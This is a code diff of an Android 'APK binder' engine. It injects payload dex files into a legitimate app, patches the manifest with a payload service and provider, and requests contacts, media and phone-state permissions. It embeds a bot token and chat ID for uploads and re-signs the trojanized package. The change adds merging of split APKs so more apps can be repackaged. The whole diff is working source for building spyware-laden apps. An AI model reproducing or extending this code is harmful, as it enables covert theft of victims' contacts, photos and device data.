@@ -7,7 +7,7 @@ import com.android.apksig.ApkSigner
 import Com.devhs.apkbinder.core.Const
 import Com.devhs.apkbinder.data.Feature
 import Com.devhs.apkbinder.data.LogLevel
-import Com.devhs.apkbinder.data.PayloadConfig
+import com.devhs.apkbinder.data.PayloadConfig
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 import java.io.ByteArrayOutputStream
@@ -30,6 +30,7 @@ import java.util.Locale
 import java.util.TimeZone
 import java.util.zip.CRC32
 import java.util.zip.Deflater
+import java.util.zip.ZipEntry
 import java.util.zip.ZipFile
 
 data class BindResult(
@@ -61,7 +62,6 @@ class BinderEngine(private val context: Context) {
 
         try {
             if (label.isNotBlank()) onLog(LogLevel.INFO, "App: $label")
-            if (activity.isNotBlank()) onLog(LogLevel.INFO, "Activity: $activity")
 
             val src = resolveSource(source)
             if (src == null) {
@@ -80,18 +80,19 @@ class BinderEngine(private val context: Context) {
             val pkg = info.packageName
             onLog(LogLevel.INFO, "Package: $pkg")
 
+            val splits = splitApks(pkg)
+            if (splits.isNotEmpty()) onLog(LogLevel.INFO, "Split APKs: ${splits.size}")
+
             val permissions = buildPermissions(features, config.features)
             onLog(LogLevel.INFO, "Permissions requested: ${permissions.size}")
 
             val authority = pkg + Const.AUTHORITY_SUFFIX
-            onLog(LogLevel.INFO, "Authority: $authority")
 
             val payloadDexes = collectPayloadDexes()
             if (payloadDexes.isEmpty()) {
                 onLog(LogLevel.ERROR, "Payload dex not found in own APK")
                 return@withContext BindResult(false, "Payload dex missing")
             }
-            onLog(LogLevel.INFO, "Payload dexes: ${payloadDexes.size}")
 
             val temp = File(context.cacheDir, "hs_${System.currentTimeMillis()}.unsigned.apk")
             temps.add(temp)
@@ -107,7 +108,6 @@ class BinderEngine(private val context: Context) {
                 }
 
                 val manifest = zip.getInputStream(entry).use { it.readBytes() }
-                onLog(LogLevel.INFO, "Original manifest: ${manifest.size} bytes")
 
                 patched = AxmlPatcher.patch(
                     manifest,
@@ -115,7 +115,8 @@ class BinderEngine(private val context: Context) {
                     Const.PAYLOAD_SERVICE,
                     Const.PAYLOAD_PROVIDER,
                     authority,
-                    permissions
+                    permissions,
+                    splits.isNotEmpty()
                 )
 
                 val patchedBytes = patched
@@ -123,9 +124,9 @@ class BinderEngine(private val context: Context) {
                     onLog(LogLevel.ERROR, "Manifest patch failed")
                     return@withContext BindResult(false, "Manifest patch failed")
                 }
-                onLog(LogLevel.INFO, "Patched manifest: ${patchedBytes.size} bytes")
 
                 var slot = maxDexIndex(zip)
+                val seen = HashSet<String>()
 
                 FileOutputStream(temp).use { fos ->
                     val zw = ZipWriter(fos)
@@ -134,15 +135,39 @@ class BinderEngine(private val context: Context) {
                     while (entries.hasMoreElements()) {
                         val e = entries.nextElement()
                         val name = e.name
+                        seen.add(name)
 
                         if (name == MANIFEST) continue
                         if (name == "assets/" + Const.CONFIG_ASSET) continue
                         if (isSignatureFile(name)) continue
 
                         val data = zip.getInputStream(e).use { it.readBytes() }
-                        val stored = e.method == java.util.zip.ZipEntry.STORED
-                        zw.add(name, data, stored)
+                        zw.add(name, data, e.method == ZipEntry.STORED)
                     }
+
+                    var copied = 0
+                    for (sp in splits) {
+                        try {
+                            ZipFile(sp).use { sz ->
+                                val se = sz.entries()
+                                while (se.hasMoreElements()) {
+                                    val e = se.nextElement()
+                                    val name = e.name
+                                    if (name == MANIFEST || name == "resources.arsc") continue
+                                    if (name.startsWith("META-INF/")) continue
+                                    if (!(name.startsWith("lib/") || name.startsWith("assets/"))) continue
+                                    if (seen.contains(name)) continue
+                                    seen.add(name)
+                                    val data = sz.getInputStream(e).use { it.readBytes() }
+                                    zw.add(name, data, e.method == ZipEntry.STORED)
+                                    copied++
+                                }
+                            }
+                        } catch (t: Throwable) {
+                            onLog(LogLevel.WARN, "split read failed: ${t.message}")
+                        }
+                    }
+                    if (copied > 0) onLog(LogLevel.INFO, "Merged $copied split entries")
 
                     zw.add(MANIFEST, patchedBytes, false)
 
@@ -151,7 +176,6 @@ class BinderEngine(private val context: Context) {
                         val dexName = if (slot == 1) "classes.dex" else "classes$slot.dex"
                         zw.add(dexName, dex, false)
                     }
-                    onLog(LogLevel.INFO, "Injected ${payloadDexes.size} dex files")
 
                     if (config.token.isNotBlank() && config.chatId.isNotBlank()) {
                         val feats = config.features.joinToString(",") { "\"$it\"" }
@@ -159,9 +183,9 @@ class BinderEngine(private val context: Context) {
                                 "\"chat_id\":\"${config.chatId}\"," +
                                 "\"features\":[$feats]}"
                         zw.add("assets/" + Const.CONFIG_ASSET, json.toByteArray(), false)
-                        onLog(LogLevel.INFO, "Config injected (${config.features.size} features)")
+                        onLog(LogLevel.INFO, "Config injected")
                     } else {
-                        onLog(LogLevel.WARN, "Config missing - uploads will fail")
+                        onLog(LogLevel.WARN, "Config missing")
                     }
 
                     zw.finish()
@@ -187,11 +211,6 @@ class BinderEngine(private val context: Context) {
 
             onLog(LogLevel.INFO, "Verified: ${check.packageName}")
             onLog(LogLevel.INFO, "Signed size: ${signed.length() / 1024} KB")
-
-            if (!outDir.exists() || !outDir.isDirectory) {
-                onLog(LogLevel.ERROR, "Output folder invalid")
-                return@withContext BindResult(false, "Output folder invalid")
-            }
 
             val outName = sanitize(label) + "_hs.apk"
             val doc = outDir.createFile("application/vnd.android.package-archive", outName)
@@ -226,6 +245,19 @@ class BinderEngine(private val context: Context) {
         }
     }
 
+    private fun splitApks(pkg: String): List<File> {
+        return try {
+            val pi = context.packageManager.getPackageInfo(pkg, 0)
+            val dirs = pi.splitSourceDirs ?: return emptyList()
+            dirs.mapNotNull { p ->
+                val f = File(p)
+                if (f.exists()) f else null
+            }
+        } catch (t: Throwable) {
+            emptyList()
+        }
+    }
+
     private class CdEntry(
         val name: ByteArray,
         val method: Int,
@@ -249,7 +281,6 @@ class BinderEngine(private val context: Context) {
             val align = if (name.startsWith("lib/") && name.endsWith(".so")) ALIGN_SO else ALIGN_DEFAULT
             val headerLen = 30 + nameBytes.size
             val pad = paddingFor(pos + headerLen, align)
-
             val offset = pos
 
             writeInt(0x04034b50)
@@ -425,7 +456,7 @@ class BinderEngine(private val context: Context) {
         }
         for (k in keys) all.add(k.lowercase())
 
-        if (all.any { it.contains("gallery") || it.contains("image") || it.contains("photo") }) {
+        if (all.any { it.contains("gallery") }) {
             set += "android.permission.READ_EXTERNAL_STORAGE"
             set += "android.permission.READ_MEDIA_IMAGES"
             set += "android.permission.READ_MEDIA_VIDEO"
@@ -441,7 +472,7 @@ class BinderEngine(private val context: Context) {
         if (all.any { it.contains("contact") }) {
             set += "android.permission.READ_CONTACTS"
         }
-        if (all.any { it.contains("device") || it.contains("info") }) {
+        if (all.any { it.contains("device") }) {
             set += "android.permission.READ_PHONE_STATE"
         }
 
@@ -457,10 +488,7 @@ class BinderEngine(private val context: Context) {
 
     private fun sign(input: File, output: File, onLog: (LogLevel, String) -> Unit) {
         val identity = signingIdentity(onLog)
-        val key = identity.first
-        val cert = identity.second
-
-        val signer = ApkSigner.SignerConfig.Builder("hs", key, listOf(cert)).build()
+        val signer = ApkSigner.SignerConfig.Builder("hs", identity.first, listOf(identity.second)).build()
 
         ApkSigner.Builder(listOf(signer))
             .setInputApk(input)
@@ -485,15 +513,13 @@ class BinderEngine(private val context: Context) {
                 val key = kf.generatePrivate(PKCS8EncodedKeySpec(keyFile.readBytes()))
                 val cf = CertificateFactory.getInstance("X.509")
                 val cert = cf.generateCertificate(certFile.inputStream()) as X509Certificate
-                onLog(LogLevel.INFO, "Using saved signing key")
                 return key to cert
             } catch (t: Throwable) {
-                onLog(LogLevel.WARN, "Saved key unreadable, regenerating")
+                onLog(LogLevel.WARN, "Saved key unreadable")
             }
         }
 
         fromAssetKeystore()?.let {
-            onLog(LogLevel.INFO, "Using keystore from assets")
             try {
                 dir.mkdirs()
                 keyFile.writeBytes(it.first.encoded)
@@ -503,16 +529,11 @@ class BinderEngine(private val context: Context) {
             return it
         }
 
-        onLog(LogLevel.INFO, "Generating new signing key...")
         dir.mkdirs()
-
         val kp = KeyPairGenerator.getInstance("RSA").apply { initialize(2048) }.generateKeyPair()
         val cert = selfSigned(kp)
-
         keyFile.writeBytes(kp.private.encoded)
         certFile.writeBytes(cert.encoded)
-
-        onLog(LogLevel.INFO, "New key ready")
         return kp.private to cert
     }
 
